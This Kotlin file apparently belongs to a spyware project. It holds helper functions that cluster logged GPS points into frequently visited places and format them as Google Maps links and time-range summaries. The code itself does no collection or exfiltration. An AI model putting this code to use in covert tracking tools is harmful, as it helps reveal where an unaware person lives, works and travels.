import android.content.Context
import android.os.Environment
import com.example.spyware.common.Constants.Companion.DISTINGUISHING_DISTANCE_KM
import com.example.spyware.common.Constants.Companion.END_TIMESTAMP
import com.example.spyware.common.Constants.Companion.LATITUDE
import com.example.spyware.common.Constants.Companion.LONGITUDE
import com.example.spyware.common.Constants.Companion.START_TIMESTAMP
import com.example.spyware.common.Constants.Companion.TIMESTAMP
import com.example.spyware.common.Constants.Companion.logShift
import com.example.spyware.common.Constants.Companion.outputFileName
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.FileInputStream
import java.time.Instant
import java.time.ZoneId
import java.time.format.DateTimeFormatter
import java.time.temporal.ChronoUnit
import java.util.UUID
import kotlin.math.atan2
import kotlin.math.cos



fun getGoogleMapsLocation(location:JSONObject): String {
    return "https://www.google.com/maps/place/"+location.getDouble(LATITUDE)+","+location.getDouble(LONGITUDE)
}

fun formatHeatmap(location:JSONObject): String {
    return convertUtcToLocal(location.getString(START_TIMESTAMP))+" -> "+convertUtcToLocal(location.getString(END_TIMESTAMP))+" | "+getGoogleMapsLocation(location)
}



fun getGoogleMapsPath(locations:List<JSONObject>): String {
    var result="https://www.google.co.in/maps/dir"
    locations.forEach{location:JSONObject->result+="/"+location.getDouble(LATITUDE)+","+location.getDouble(LONGITUDE)}
    return result;
}


fun getImportantLocations(locations:List<JSONObject>): List<JSONObject> {
    var result = mutableListOf<JSONObject>()
    var i=0
    while (i <locations.size) {
        var j=i+1
        while(j<locations.size && calculateDistance(locations[i],locations[j])< DISTINGUISHING_DISTANCE_KM){
            j++
        }
        if(j-i>=2){
            var bestEstimateLocation=estimateLocation(locations,i,j-1)
            var entry=JSONObject().put(START_TIMESTAMP,locations[i].getString(TIMESTAMP)).put(
                END_TIMESTAMP,locations[j-1].getString(TIMESTAMP)).put(LATITUDE,bestEstimateLocation.getDouble(
                LATITUDE)).put(LONGITUDE,bestEstimateLocation.getDouble(LONGITUDE))
            result.add(entry)
        }
        i=j
    }
    return result
}

fun estimateLocation(locations:List<JSONObject>,i:Int,j:Int):JSONObject{
    var x=i
    var sumLat=0.0
    var sumLon=0.0
    while(x<=j){
        sumLat+=locations[x].getDouble(LATITUDE)
        sumLon+=locations[x].getDouble(LONGITUDE)
        x++
    }
    return JSONObject().put(LATITUDE,sumLat/(j-i+1)).put(LONGITUDE,sumLon/(j-i+1))
}

fun convertUtcToLocal(utcTime: String): String {
    val utcFormatter = DateTimeFormatter.ISO_INSTANT.withZone(ZoneId.of("UTC"))
    val instant = Instant.from(utcFormatter.parse(utcTime))
    val localDateTime = instant.atZone(ZoneId.systemDefault())
    val outputFormatter = DateTimeFormatter.ofPattern("dd/MM/yyyy hh:mm:ss a")
    return outputFormatter.format(localDateTime)
}


